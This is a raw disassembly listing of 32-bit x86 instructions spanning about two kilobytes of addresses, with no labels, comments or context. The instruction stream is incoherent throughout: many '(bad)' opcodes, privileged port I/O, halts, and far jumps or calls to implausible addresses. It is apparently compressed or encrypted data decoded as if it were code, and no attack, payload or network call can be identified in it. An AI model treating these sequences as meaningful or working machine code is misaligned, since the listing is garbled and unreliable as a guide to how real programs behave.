  419bc1:	inc    ebx
  419bc2:	sbb    bl,BYTE PTR cs:[ebp+0x66]
  419bc6:	cli    
  419bc7:	fld    TBYTE PTR [ecx+0x60971c97]
  419bcd:	adc    eax,0x6dac85e6
  419bd2:	add    dh,BYTE PTR [ebp-0x32]
  419bd5:	leave  
  419bd6:	jecxz  0x419c0c
  419bd8:	and    eax,0x3b492f4a
  419bdd:	jl     0x419bf7
  419bdf:	and    BYTE PTR gs:[eax+0x5d],dl
  419be3:	xor    eax,0x4c5cd36b
  419be8:	lods   al,BYTE PTR ds:[esi]
  419be9:	dec    edx
  419bea:	hlt    
  419beb:	or     BYTE PTR [edx+0x6b0982ef],ah
  419bf1:	iret   
  419bf2:	call   0xe238358d
  419bf7:	xchg   edi,eax
  419bf8:	push   edx
  419bf9:	(bad)  
  419bfa:	jnp    0x419bac
  419bfc:	add    ebx,DWORD PTR [edx+0x11]
  419bff:	inc    edx
  419c00:	pop    ebx
  419c01:	stos   DWORD PTR es:[edi],eax
  419c02:	dec    edi
  419c03:	ds sbb edi,ebx
  419c06:	push   ss
  419c07:	cmp    DWORD PTR [ecx],eax
  419c09:	repz pop ebx
  419c0b:	ja     0x419bc7
  419c0d:	aaa    
  419c0e:	test   DWORD PTR [edx+0x1c80f105],ebp
  419c14:	rcl    eax,0x35
  419c17:	loope  0x419c47
  419c19:	xchg   ebx,eax
  419c1a:	aad    0x94
  419c1c:	add    DWORD PTR [eax+ebx*4],edx
  419c1f:	add    eax,0xb79b9dcc
  419c24:	add    ch,bl
  419c26:	fwait
  419c27:	sbb    al,cl
  419c29:	and    edx,DWORD PTR [edx+eax*1-0x6f]
  419c2d:	sub    al,BYTE PTR [edx]
  419c2f:	and    eax,0x1816e15a
  419c34:	pop    ebp
  419c35:	xchg   ebx,eax
  419c36:	pop    ebx
  419c37:	mov    WORD PTR [ebx-0x75ec9812],es
  419c3d:	loop   0x419c50
  419c3f:	mov    ds:0x206ed650,eax
  419c44:	mov    eax,ecx
  419c46:	jmp    DWORD PTR [eax]
  419c48:	cmp    eax,0x88a0d839
  419c4d:	in     eax,0xe8
  419c4f:	mov    DWORD PTR [ebp+0x2c],esp
  419c52:	(bad)  
  419c53:	(bad)  
  419c54:	std    
  419c55:	es xchg ecx,eax
  419c57:	inc    edi
  419c58:	test   BYTE PTR [ebx+0x8],dh
  419c5b:	or     bl,bh
  419c5d:	repz push es
  419c5f:	adc    al,0xdd
  419c61:	dec    eax
  419c62:	ret    0x1fd
  419c65:	es fsubr st(5),st
  419c68:	inc    edx
  419c69:	cmp    ebp,ebp
  419c6b:	ds int3 
  419c6d:	jmp    ebp
  419c6f:	pop    es
  419c70:	and    eax,0x498055c0
  419c75:	jle    0x419c3c
  419c77:	aam    0xa4
  419c79:	sub    DWORD PTR [ebx-0x1f],ecx
  419c7c:	cmp    esi,DWORD PTR [ebx-0x3f]
  419c7f:	pusha  
  419c80:	and    esp,DWORD PTR [edx+ecx*4]
  419c83:	sub    al,BYTE PTR [eax-0x6db9975c]
  419c89:	adc    BYTE PTR [ecx+0x62390051],bh
  419c8f:	push   ebp
  419c90:	dec    ebx
  419c91:	mov    ds:0xd73e596d,eax
  419c96:	mov    eax,0x3ec9743e
  419c9b:	lods   eax,DWORD PTR ds:[esi]
  419c9c:	sar    BYTE PTR [ebp+0x7],1
  419c9f:	ins    DWORD PTR es:[edi],dx
  419ca0:	push   esi
  419ca1:	adc    eax,0x655c69a8
  419ca6:	inc    edi
  419ca7:	mov    ebx,0x8332c4df
  419cad:	xchg   ecx,eax
  419cae:	pop    esp
  419caf:	shr    DWORD PTR [edx+0x34e35e6c],1
  419cb5:	test   al,0x18
  419cb7:	lods   al,BYTE PTR ds:[esi]
  419cb8:	push   0x86d5e00b
  419cbd:	shl    DWORD PTR [eax-0x2d20612b],cl
  419cc3:	cld    
  419cc4:	or     ebx,ecx
  419cc6:	rol    DWORD PTR ds:0xf5ed3a26,1
  419ccc:	mov    edi,0x7f918979
  419cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd2:	mov    ebp,es
  419cd4:	retf   
  419cd5:	idiv   BYTE PTR [ebx+0x16]
  419cd8:	leave  
  419cd9:	push   esi
  419cda:	out    dx,al
  419cdb:	add    ecx,esi
  419cdd:	outs   dx,DWORD PTR ds:[esi]
  419cde:	xchg   DWORD PTR [esi-0x5b],esp
  419ce1:	pushf  
  419ce2:	aam    0x76
  419ce4:	dec    ecx
  419ce5:	mov    cl,0xb1
  419ce7:	stc    
  419ce8:	inc    esp
  419ce9:	push   edx
  419cea:	adc    al,0x6e
  419cec:	lock test BYTE PTR [edi],0x59
  419cf0:	xor    DWORD PTR [esi+0x22e71f1a],esp
  419cf6:	and    cl,cl
  419cf8:	in     eax,dx
  419cf9:	aad    0x24
  419cfb:	add    DWORD PTR [esi+0x78],0x85f7415b
  419d02:	lahf   
  419d03:	jmp    0x3be4:0x5744cbe6
  419d0a:	mov    esp,0x6d2ba848
  419d0f:	lods   al,BYTE PTR ds:[esi]
  419d10:	xchg   edx,eax
  419d11:	pusha  
  419d12:	sbb    al,0x8e
  419d14:	loope  0x419d11
  419d16:	pop    ebx
  419d17:	add    eax,0x13d06d53
  419d1c:	ds xchg esp,eax
  419d1e:	pop    ebp
  419d1f:	sbb    eax,0xfbf0e0ef
  419d24:	mov    bl,0x99
  419d26:	repz mov edx,0x1bba641a
  419d2c:	sub    dh,dh
  419d2e:	sbb    dl,BYTE PTR [eax]
  419d30:	xor    BYTE PTR [ebp+0x6a831ded],ah
  419d36:	test   BYTE PTR [ebx-0x55],0x27
  419d3a:	mov    esi,0xb350d9ed
  419d3f:	xchg   ebp,eax
  419d40:	push   0x4c
  419d42:	fucomp st(3)
  419d44:	cwde   
  419d45:	push   esp
  419d46:	sbb    DWORD PTR [edx-0x24f4d5cb],ebp
  419d4c:	lock sti 
  419d4e:	add    al,0x85
  419d50:	test   BYTE PTR [edi+0x67],dl
  419d53:	icebp  
  419d54:	or     al,0x45
  419d56:	shr    DWORD PTR [edx],0x91
  419d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d5a:	mov    esp,0xc755e216
  419d5f:	xor    esi,DWORD PTR [eax-0x3abacf49]
  419d65:	int    0xe
  419d67:	ins    DWORD PTR es:[edi],dx
  419d68:	mov    dh,0x22
  419d6a:	mov    bl,0xa9
  419d6c:	into   
  419d6d:	pop    ss
  419d6e:	xchg   BYTE PTR [eax+0x493bcf34],ah
  419d74:	mov    esp,0x809de46d
  419d79:	int    0x81
  419d7b:	xchg   ebx,eax
  419d7c:	popa   
  419d7d:	shr    BYTE PTR [edx],1
  419d7f:	inc    ecx
  419d80:	or     bl,cl
  419d82:	sub    BYTE PTR [ecx+0x36dee657],0x0
  419d89:	lds    edi,FWORD PTR [edx]
  419d8b:	arpl   WORD PTR ds:0xd89033e1,si
  419d91:	fwait
  419d92:	loopne 0x419d9f
  419d94:	inc    ebp
  419d95:	sbb    dl,0x49
  419d98:	push   ecx
  419d99:	(bad)  
  419d9a:	cmp    DWORD PTR ds:0xd9713f06,ebp
  419da0:	jo     0x419d4c
  419da2:	adc    ecx,edi
  419da4:	ins    BYTE PTR es:[edi],dx
  419da5:	daa    
  419da6:	mov    ecx,ebp
  419da8:	inc    ecx
  419da9:	add    ebp,DWORD PTR [ebp-0x4e4fea52]
  419daf:	test   BYTE PTR [ebx+0x433bf2a7],ch
  419db5:	sub    eax,0x617055bf
  419dba:	xor    DWORD PTR [edx-0x4b],eax
  419dbd:	push   esp
  419dbe:	repnz and eax,edi
  419dc1:	inc    ebp
  419dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dc3:	repnz adc BYTE PTR [esp+edx*2+0x8],al
  419dc8:	sar    cl,0x43
  419dcb:	sub    edx,DWORD PTR [eax-0x6a]
  419dce:	cmp    ecx,eax
  419dd0:	ror    DWORD PTR [edi+edi*2-0x6f],cl
  419dd4:	and    DWORD PTR [esp+ebp*4],ebp
  419dd7:	sar    al,1
  419dd9:	das    
  419dda:	pop    eax
  419ddb:	lods   eax,DWORD PTR ds:[esi]
  419ddc:	or     ebx,DWORD PTR [ecx]
  419dde:	cmc    
  419ddf:	pop    esp
  419de0:	push   ebx
  419de1:	xchg   edi,eax
  419de2:	outs   dx,DWORD PTR ds:[esi]
  419de3:	mov    ch,0xb3
  419de5:	xor    BYTE PTR [esi],0xe8
  419de8:	out    0xd3,eax
  419dea:	sbb    BYTE PTR [edx],bl
  419dec:	mov    eax,ds:0x20a61642
  419df1:	int3   
  419df2:	pop    eax
  419df3:	inc    eax
  419df4:	mov    ch,0xce
  419df6:	imul   ebx,DWORD PTR [ebx+0x2dce1399],0x28d547ca
  419e00:	int3   
  419e01:	xor    BYTE PTR [ebp+0x8],cl
  419e04:	pop    edi
  419e06:	dec    ebp
  419e07:	fst    QWORD PTR [edi-0x7]
  419e0a:	inc    ecx
  419e0b:	dec    esi
  419e0c:	sub    cl,BYTE PTR [edi-0x3d0add10]
  419e12:	rcr    DWORD PTR [edx+0x2d5afcf0],1
  419e18:	and    dh,dl
  419e1a:	mov    ebx,0x77824b0c
  419e1f:	fnstsw WORD PTR [edx-0x49]
  419e22:	xchg   ebx,eax
  419e23:	add    al,BYTE PTR [ebp-0x26b5aa83]
  419e29:	sbb    DWORD PTR [ebx+0x4c7a65fd],ebp
  419e2f:	retf   
  419e30:	dec    ecx
  419e31:	xchg   ebx,eax
  419e32:	cmp    ebx,DWORD PTR [ebp-0x1a]
  419e35:	fdiv   DWORD PTR [ebp+0x5d]
  419e38:	push   esi
  419e39:	inc    ebp
  419e3a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  419e3c:	fs sub esi,ebx
  419e3f:	mov    ds:0x88034a70,al
  419e44:	outs   dx,DWORD PTR ds:[esi]
  419e45:	pop    ebx
  419e46:	imul   edx,DWORD PTR [edx+edx*2-0x6f],0x60
  419e4b:	xchg   dl,bh
  419e4d:	dec    ebx
  419e4e:	pop    ecx
  419e4f:	xchg   ebx,eax
  419e50:	jecxz  0x419e04
  419e52:	test   al,0x3f
  419e54:	pop    ds
  419e55:	dec    edi
  419e56:	jp     0x419e5c
  419e58:	sub    eax,0x172263d8
  419e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e5e:	xchg   ebp,eax
  419e5f:	mov    ebp,0xeb6c9b4
  419e64:	out    0x4a,al
  419e66:	inc    ebp
  419e67:	jp     0x419eb5
  419e69:	icebp  
  419e6a:	push   edi
  419e6b:	ficom  DWORD PTR [edi+0xd]
  419e6e:	xchg   edx,eax
  419e6f:	mov    ds:0x641a9b6f,al
  419e74:	or     al,0x7a
  419e76:	and    edi,DWORD PTR [ecx-0x5130a3a0]
  419e7c:	lahf   
  419e7d:	xor    BYTE PTR [eax-0x59],0xf2
  419e81:	sbb    eax,0x82ea2f98
  419e86:	fidivr WORD PTR [ecx+0x5894acfc]
  419e8c:	push   es
  419e8d:	je     0x419eed
  419e8f:	jmp    0xc615:0x3d78e761
  419e96:	dec    edi
  419e97:	mov    ?,ebp
  419e99:	test   eax,0xaa07c57a
  419e9e:	out    dx,eax
  419e9f:	jne    0x419f1a
  419ea1:	xchg   edx,eax
  419ea2:	xchg   ecx,eax
  419ea3:	dec    edx
  419ea4:	es repz sahf 
  419ea7:	push   ebp
  419ea8:	pop    esp
  419ea9:	jo     0x419e72
  419eab:	xchg   ebx,eax
  419eac:	add    dl,BYTE PTR [edx]
  419eae:	add    cl,al
  419eb0:	or     cl,bl
  419eb2:	lods   eax,DWORD PTR ds:[esi]
  419eb3:	or     BYTE PTR [ebx-0x10],cl
  419eb6:	sahf   
  419eb7:	push   es
  419eb8:	xor    esi,DWORD PTR [eax]
  419eba:	inc    ecx
  419ebb:	sbb    ah,BYTE PTR [ebx]
  419ebd:	pop    ds
  419ebe:	push   esp
  419ebf:	push   ecx
  419ec0:	lahf   
  419ec1:	cmp    BYTE PTR [edx+0x21],ah
  419ec4:	jne    0x419e8c
  419ec6:	xchg   BYTE PTR [edi+0x35],al
  419ec9:	or     ch,BYTE PTR [esi-0x26a3f5df]
  419ecf:	out    0x65,al
  419ed1:	adc    BYTE PTR [edx+edi*2-0x27],al
  419ed5:	out    0xf4,al
  419ed7:	std    
  419ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ed9:	ret    0x4113
  419edc:	sub    eax,DWORD PTR [ebx-0x685e2c2e]
  419ee2:	loopne 0x419e6e
  419ee4:	or     DWORD PTR [eax+0x7f97376d],edx
  419eea:	push   edi
  419eeb:	into   
  419eec:	or     eax,0x79c0a17f
  419ef1:	test   BYTE PTR [edi],0x65
  419ef4:	lds    ecx,FWORD PTR [edi+0x1a1a50fa]
  419efa:	sbb    BYTE PTR [eax-0x3f],ah
  419efd:	into   
  419efe:	int3   
  419eff:	mov    al,ds:0xbe47f701
  419f04:	(bad)  
  419f05:	mov    dl,0x29
  419f07:	inc    edi
  419f08:	fmul   st(4),st
  419f0a:	mov    esp,0x18e743f
  419f0f:	lods   al,BYTE PTR ds:[esi]
  419f10:	pop    esi
  419f11:	jmp    DWORD PTR [eax+0x22f7bf79]
  419f17:	sahf   
  419f18:	or     eax,0xcd9f83
  419f1d:	aas    
  419f1e:	or     BYTE PTR [ecx-0x60a2ef93],dh
  419f24:	xchg   BYTE PTR [esi+eiz*2-0x1a],al
  419f28:	and    edx,DWORD PTR [ebp+0x6b10029a]
  419f2e:	sti    
  419f2f:	xlat   BYTE PTR ds:[ebx]
  419f30:	fcom   DWORD PTR [ebx+eiz*8+0x1a]
  419f34:	adc    al,BYTE PTR [esi+0x39]
  419f37:	shl    BYTE PTR [esi+0x6d97c7ec],1
  419f3d:	out    0xef,eax
  419f3f:	xlat   BYTE PTR ds:[ebx]
  419f40:	xor    edx,DWORD PTR [edi-0x26]
  419f43:	mov    edi,0xa9f63883
  419f48:	pop    ecx
  419f49:	xchg   edi,eax
  419f4a:	jns    0x419f8e
  419f4c:	sub    al,0xc8
  419f4e:	fadd   QWORD PTR [eax-0x16]
  419f51:	dec    edi
  419f52:	inc    esp
  419f53:	push   0xf881f292
  419f58:	repnz mov edx,0x32af152d
  419f5e:	mov    esp,0x1e0416cc
  419f63:	fnstenv [edi+0x5b32e230]
  419f69:	cmp    DWORD PTR [edi],edx
  419f6b:	and    eax,0x6693ae99
  419f70:	out    dx,eax
  419f71:	xchg   BYTE PTR [edx+ebx*1+0x32751ca2],ah
  419f78:	cmp    al,0x18
  419f7a:	add    BYTE PTR [edx],al
  419f7c:	aaa    
  419f7d:	jecxz  0x419f5e
  419f7f:	xchg   ebx,eax
  419f80:	das    
  419f81:	out    dx,eax
  419f82:	das    
  419f83:	cmp    ecx,edi
  419f85:	jmp    0x8b15a8a9
  419f8a:	and    bh,cl
  419f8c:	out    0xf8,al
  419f8e:	pushf  
  419f8f:	inc    ebx
  419f90:	mov    eax,ds:0x78826859
  419f95:	dec    esp
  419f96:	pop    edx
  419f97:	xor    al,0x2e
  419f99:	xchg   esp,eax
  419f9a:	adc    DWORD PTR [ebp+0x38],esp
  419f9d:	test   eax,0x92f7cb13
  419fa2:	mov    fs,WORD PTR [ecx+0x19]
  419fa5:	cmp    dh,BYTE PTR [ebp+0x11]
  419fa8:	addr16 das 
  419faa:	data16 lahf 
  419fac:	sbb    eax,0xcbfa9836
  419fb1:	(bad)  
  419fb3:	push   ss
  419fb4:	dec    edi
  419fb5:	(bad)  
  419fb6:	imul   edi,DWORD PTR [eax],0x5865bcf0
  419fbc:	arpl   WORD PTR [eax+0x653a77bb],sp
  419fc2:	push   es
  419fc3:	not    DWORD PTR [ecx+edi*4-0x8]
  419fc7:	mov    ds,WORD PTR [ecx-0x3cbdfde]
  419fcd:	dec    ebx
  419fce:	or     edi,DWORD PTR [ecx]
  419fd0:	iret   
  419fd1:	xor    eax,0xea37d5b6
  419fd6:	add    al,0xaf
  419fd8:	bsf    esi,DWORD PTR [ebp-0x1b95df74]
  419fdf:	fsubr  QWORD PTR [edi]
  419fe1:	pusha  
  419fe2:	mov    edx,0x705e3be3
  419fe7:	out    0x33,al
  419fe9:	xchg   ebx,eax
  419fea:	cmp    DWORD PTR [ecx+0x6d],edi
  419fed:	or     ch,BYTE PTR [ebx+0x70]
  419ff0:	pop    edi
  419ff1:	in     eax,dx
  419ff2:	shl    DWORD PTR [eax],1
  419ff4:	pop    es
  419ff5:	mov    ds:0x9a8153a,eax
  419ffa:	(bad)  
  419ffb:	jmp    0x41a012
  419ffd:	ret    
  419ffe:	push   ebx
  419fff:	repz out dx,eax
  41a001:	mov    WORD PTR [eax+eax*8-0x4e],gs
  41a005:	(bad)  
  41a006:	xor    al,0x83
  41a008:	pop    ss
  41a009:	daa    
  41a00a:	or     al,0x62
  41a00c:	cs inc edx
  41a00e:	mov    esp,0x65740312
  41a013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a014:	ins    DWORD PTR es:[edi],dx
  41a015:	(bad)  
  41a016:	aaa    
  41a017:	iret   
  41a018:	sbb    BYTE PTR [ebx],ch
  41a01a:	(bad)  
  41a01b:	sti    
  41a01c:	arpl   WORD PTR [ebx+0x71489f0e],ax
  41a022:	add    DWORD PTR [eax+0x67dc8b47],edi
  41a028:	cmp    ebp,eax
  41a02a:	fisub  WORD PTR [esi]
  41a02c:	add    cl,dl
  41a02e:	cmp    BYTE PTR [ecx],0xdf
  41a031:	scas   eax,DWORD PTR es:[edi]
  41a032:	sub    ch,BYTE PTR [esi]
  41a034:	push   eax
  41a035:	mov    ah,0x31
  41a037:	dec    edx
  41a038:	mov    esp,0xc1fd238
  41a03d:	cld    
  41a03e:	aam    0x7f
  41a040:	cli    
  41a041:	dec    edx
  41a042:	popf   
  41a043:	push   ds
  41a044:	mov    ecx,0x7c5b5132
  41a049:	fiadd  WORD PTR [eax-0x2]
  41a04c:	test   DWORD PTR [esi],esp
  41a04e:	cmp    BYTE PTR [edx],dl
  41a050:	mov    ds,WORD PTR [esp+ecx*1-0x80]
  41a054:	add    DWORD PTR [esi+0x5d],edi
  41a057:	xchg   DWORD PTR [esp+esi*4+0x22],esp
  41a05b:	add    eax,DWORD PTR [eax+0x36a96026]
  41a061:	add    DWORD PTR [ebx-0x7f0d962b],edi
  41a067:	xchg   esi,eax
  41a068:	(bad)  
  41a06a:	mov    ds:0x991dade7,eax
  41a06f:	jecxz  0x41a035
  41a071:	sub    DWORD PTR [eax-0x6de41bcd],0x1
  41a078:	jp     0x41a0ab
  41a07a:	pop    ebp
  41a07b:	rcr    dh,cl
  41a07d:	fsub   QWORD PTR [edi+eiz*1]
  41a080:	jmp    DWORD PTR [ebx+eiz*1]
  41a083:	fs push ds
  41a085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a086:	mov    ch,0x64
  41a088:	call   0x849abff2
  41a08d:	and    al,0x7a
  41a08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a090:	lea    esi,gs:[eax+ecx*4]
  41a094:	mov    DWORD PTR [edx+ebx*8-0x3e],esi
  41a098:	into   
  41a099:	cdq    
  41a09a:	stc    
  41a09b:	mov    ebx,edi
  41a09d:	jp     0x41a07f
  41a09f:	(bad)  
  41a0a0:	leave  
  41a0a1:	test   BYTE PTR [ebp+0x25095d7c],cl
  41a0a7:	jb     0x41a077
  41a0a9:	jle    0x41a0b7
  41a0ab:	lods   eax,DWORD PTR ds:[esi]
  41a0ac:	sbb    esi,DWORD PTR [ecx+0x4b]
  41a0af:	add    DWORD PTR [ecx],0x8a4fd2cc
  41a0b5:	adc    DWORD PTR [ebp-0x33],0xb05719b4
  41a0bc:	ja     0x41a0c9
  41a0be:	mov    ebx,0x7df676ae
  41a0c3:	jl     0x41a114
  41a0c5:	adc    eax,DWORD PTR [ecx+0x4195ae84]
  41a0cb:	or     esi,ebp
  41a0cd:	jmp    0x41a0fc
  41a0cf:	pusha  
  41a0d0:	push   ebx
  41a0d1:	iret   
  41a0d2:	(bad)  
  41a0d3:	xchg   BYTE PTR [edi-0x23],ch
  41a0d6:	out    0x59,eax
  41a0d8:	sub    ch,BYTE PTR [edi]
  41a0da:	jnp    0x41a142
  41a0dc:	mov    ch,0xa5
  41a0de:	fimul  WORD PTR [ecx+0x18]
  41a0e1:	enter  0xbce5,0x97
  41a0e5:	test   BYTE PTR [esi+0x28],dh
  41a0e8:	jb     0x41a09a
  41a0ea:	inc    ebp
  41a0eb:	lds    eax,FWORD PTR [eax+ecx*8+0x3a75c9ca]
  41a0f2:	pop    ss
  41a0f3:	jbe    0x41a0a5
  41a0f5:	repz xor cl,cl
  41a0f8:	lods   eax,DWORD PTR ds:[esi]
  41a0f9:	cli    
  41a0fa:	push   ecx
  41a0fb:	and    eax,0x2e2b5e93
  41a100:	xlat   BYTE PTR ds:[ebx]
  41a101:	xchg   esi,eax
  41a102:	dec    ecx
  41a103:	inc    esi
  41a104:	lds    ecx,FWORD PTR [ebx-0x7dbb9061]
  41a10a:	int    0xd9
  41a10c:	sbb    bh,0xb3
  41a10f:	ror    DWORD PTR [edi],1
  41a111:	fimul  WORD PTR [ecx+0x43607362]
  41a117:	imul   ebx,DWORD PTR [ebx+0xff36f69],0xa817c07c
  41a121:	dec    ebp
  41a122:	jl     0x41a0fa
  41a124:	push   0xb75b8f29
  41a129:	and    BYTE PTR [esi+0x1e81fd84],ch
  41a12f:	stos   BYTE PTR es:[edi],al
  41a130:	inc    ebp
  41a131:	sub    dh,ah
  41a133:	xor    al,0xe6
  41a135:	inc    ebx
  41a136:	inc    esi
  41a137:	inc    ebx
  41a138:	mov    al,0x87
  41a13a:	dec    esp
  41a13b:	and    esp,ecx
  41a13d:	sub    cl,bl
  41a13f:	fbld   TBYTE PTR [eax]
  41a141:	adc    al,0x2b
  41a143:	(bad)  
  41a144:	imul   esp,ecx,0x14e5f920
  41a14a:	out    0x3b,al
  41a14c:	jl     0x41a1b0
  41a14e:	cdq    
  41a14f:	inc    esi
  41a150:	aaa    
  41a151:	call   FWORD PTR ds:[ebx]
  41a154:	repz sbb BYTE PTR [esi+0x3e1ffa3b],bh
  41a15b:	inc    edi
  41a15c:	pusha  
  41a15d:	mov    BYTE PTR [eax-0x14b0cd9b],cl
  41a163:	push   esi
  41a164:	mov    ch,0x3e
  41a166:	mov    bh,0xdb
  41a168:	ja     0x41a187
  41a16a:	adc    edx,ebp
  41a16c:	in     al,dx
  41a16d:	outs   dx,BYTE PTR ds:[esi]
  41a16e:	stc    
  41a16f:	mov    ds:0x16d4b4b9,al
  41a174:	lods   eax,DWORD PTR ds:[esi]
  41a175:	sti    
  41a176:	ja     0x41a1f0
  41a178:	xor    BYTE PTR [ecx],ah
  41a17a:	lock sbb eax,0x4dbbc26d
  41a180:	cmp    DWORD PTR [ecx],edi
  41a182:	test   eax,0x947e11f1
  41a187:	clc    
  41a188:	sahf   
  41a189:	fs mov esi,0xef48b47f
  41a18f:	fwait
  41a190:	inc    edx
  41a191:	add    ebp,DWORD PTR [edx+0x2af56203]
  41a197:	sub    DWORD PTR [edi],ebp
  41a199:	cmovno ecx,eax
  41a19c:	cmp    edi,ebp
  41a19e:	inc    esp
  41a19f:	loope  0x41a1eb
  41a1a1:	and    BYTE PTR [edx-0xb],ah
  41a1a4:	sbb    BYTE PTR [esi+eax*2+0x67f35cb9],bl
  41a1ab:	popa   
  41a1ac:	out    dx,al
  41a1ad:	dec    edi
  41a1ae:	xchg   ecx,eax
  41a1af:	fadd   st(6),st
  41a1b1:	je     0x41a174
  41a1b3:	cmp    dh,BYTE PTR [edx+0x65]
  41a1b6:	dec    eax
  41a1b7:	inc    edx
  41a1b8:	jae    0x41a1bf
  41a1ba:	and    ebx,DWORD PTR [esi]
  41a1bc:	ret    
  41a1bd:	mov    es,WORD PTR [ebx]
  41a1bf:	pop    edx
  41a1c0:	push   cs
  41a1c1:	push   esp
  41a1c2:	xchg   ecx,eax
  41a1c3:	cs sub eax,0xfe308412
  41a1c9:	cmp    dh,dl
  41a1cb:	add    eax,0xb59f743a
  41a1d0:	jb     0x41a21d
  41a1d2:	xchg   ecx,eax
  41a1d3:	test   eax,0x6779a56c
  41a1d8:	cmc    
  41a1d9:	dec    esi
  41a1da:	xchg   ecx,eax
  41a1db:	push   0x4dea0a59
  41a1e0:	sub    bh,dl
  41a1e2:	xchg   edx,eax
  41a1e3:	pop    es
  41a1e4:	arpl   WORD PTR [ecx],bx
  41a1e6:	mov    edx,fs
  41a1e8:	mov    ds:0x787e9f7c,eax
  41a1ed:	cs inc eax
  41a1ef:	into   
  41a1f0:	mov    BYTE PTR [eax+0x47b22f52],ah
  41a1f6:	(bad)  
  41a1f7:	call   eax
  41a1f9:	xchg   DWORD PTR [esi],edx
  41a1fb:	mul    DWORD PTR [ecx]
  41a1fd:	mov    ecx,0xd423b1a3
  41a202:	cwde   
  41a203:	arpl   WORD PTR [edx-0x55],bx
  41a206:	inc    eax
  41a207:	mov    WORD PTR [ebx],gs
  41a209:	xchg   esp,eax
  41a20a:	ror    BYTE PTR [esi-0x26a56896],cl
  41a210:	test   DWORD PTR [eax],0x94bd559c
  41a216:	inc    ebx
  41a217:	or     esp,ebp
  41a219:	sti    
  41a21a:	mov    ebp,0x2d75325f
  41a21f:	inc    esp
  41a220:	pop    ebp
  41a221:	iret   
  41a222:	aad    0xdc
  41a224:	mov    dl,BYTE PTR fs:[esp+ebx*8-0x61]
  41a229:	jg     0x41a242
  41a22b:	cmc    
  41a22c:	inc    ebx
  41a22d:	mov    cs:0xc931c8e3,eax
  41a233:	mov    ebx,0xc91932b
  41a238:	int3   
  41a239:	mov    eax,0x42e38d7d
  41a23e:	add    al,0xcd
  41a240:	mov    ds:0x646478af,eax
  41a245:	neg    BYTE PTR [ecx]
  41a247:	lea    esi,[edx]
  41a249:	imul   DWORD PTR [ebx]
  41a24b:	mov    dl,BYTE PTR [ecx]
  41a24d:	out    dx,eax
  41a24e:	ret    0xc4b0
  41a251:	je     0x41a1f3
  41a253:	mov    ecx,ecx
  41a255:	jg     0x41a204
  41a257:	call   0x644c:0x189e042
  41a25e:	je     0x41a21e
  41a260:	add    eax,0x4e27f3
  41a265:	mov    esp,0xbe3aad54
  41a26a:	push   es
  41a26b:	loopne 0x41a208
  41a26d:	cmp    ch,BYTE PTR [esi-0xc]
  41a270:	push   eax
  41a271:	jae    0x41a2c0
  41a273:	ja     0x41a262
  41a275:	(bad)  
  41a276:	rcr    DWORD PTR ds:0xf2caad76,cl
  41a27c:	sub    DWORD PTR ds:0xf8ad04d7,edi
  41a282:	test   BYTE PTR [ecx-0x2f],dh
  41a285:	xchg   ebp,eax
  41a286:	push   0x5421dca6
  41a28b:	or     eax,0xff938324
  41a290:	pop    ecx
  41a291:	(bad)  
  41a292:	jnp    0x41a2fe
  41a294:	jmp    0xf0f5f00f
  41a299:	push   esi
  41a29a:	sbb    BYTE PTR [eax],cl
  41a29c:	sub    al,0xe5
  41a29e:	dec    ebx
  41a29f:	add    dl,cl
  41a2a1:	data16 or dl,dh
  41a2a4:	dec    esp
  41a2a5:	test   BYTE PTR [esi-0x12],cl
  41a2a8:	test   BYTE PTR [esp+ebx*2+0x7a],ch
  41a2ac:	xchg   ebx,eax
  41a2ad:	or     edi,DWORD PTR [eax-0x581898d7]
  41a2b3:	xor    al,0x8e
  41a2b5:	rcr    BYTE PTR [edx],0x32
  41a2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2b9:	je     0x41a30f
  41a2bb:	sbb    dh,al
  41a2bd:	pop    esi
  41a2be:	retf   
  41a2bf:	test   al,0xa0
  41a2c1:	xor    al,0xf
  41a2c3:	test   edi,0x2ccf8335
  41a2c9:	sbb    ah,BYTE PTR [ebx]
  41a2cb:	call   0xcde9f245
  41a2d0:	cld    
  41a2d1:	lea    ecx,[ebp+0x6c]
  41a2d4:	ins    DWORD PTR es:[edi],dx
  41a2d5:	inc    ebp
  41a2d6:	js     0x41a329
  41a2d8:	dec    ecx
  41a2d9:	xchg   BYTE PTR [eax+0x2a],ch
  41a2dc:	mov    esp,esi
  41a2de:	fwait
  41a2df:	mov    edx,0x18bb0a0e
  41a2e4:	es jno 0x41a33d
  41a2e7:	mov    bx,0x1b56
  41a2eb:	pop    eax
  41a2ec:	repnz ror BYTE PTR [ecx],0x1f
  41a2f0:	push   0xf59935f3
  41a2f5:	retf   
  41a2f6:	mov    esp,0x3b75bf9b
  41a2fb:	or     eax,0x1064de2c
  41a300:	dec    edx
  41a301:	stc    
  41a302:	idiv   BYTE PTR [eax-0x2e]
  41a305:	and    ch,bl
  41a307:	sar    DWORD PTR [ebp+0x74eb3d35],0xc5
  41a30e:	inc    edi
  41a30f:	arpl   WORD PTR [edi-0x65cc0b1e],bx
  41a315:	fst    st(5)
  41a317:	call   0x717a:0x66922dd1
  41a31e:	dec    eax
  41a31f:	cmc    
  41a320:	sub    esp,DWORD PTR [eax+edx*1+0x44]
  41a324:	mov    ch,0x23
  41a326:	sub    eax,0x6b86b006
  41a32b:	adc    BYTE PTR [edx+0x3bc4d6a1],bh
  41a331:	sub    BYTE PTR [ecx-0x5bc188aa],0xb6
  41a338:	cmp    DWORD PTR [edi+ebp*4],eax
  41a33b:	push   ss
  41a33c:	mov    edi,0xc89c1bad
  41a341:	dec    ebx
  41a342:	cmp    al,0x22
  41a344:	cld    
  41a345:	xchg   esp,eax
  41a346:	fstp   QWORD PTR [eax+0x57]
  41a349:	es enter 0x3fa5,0xb3
  41a34e:	test   BYTE PTR [ebx-0x59272455],dl
  41a354:	mov    dl,0xfd
  41a356:	(bad)  
  41a357:	push   edi
  41a358:	in     eax,0x65
  41a35a:	pop    eax
  41a35b:	jg     0x41a325
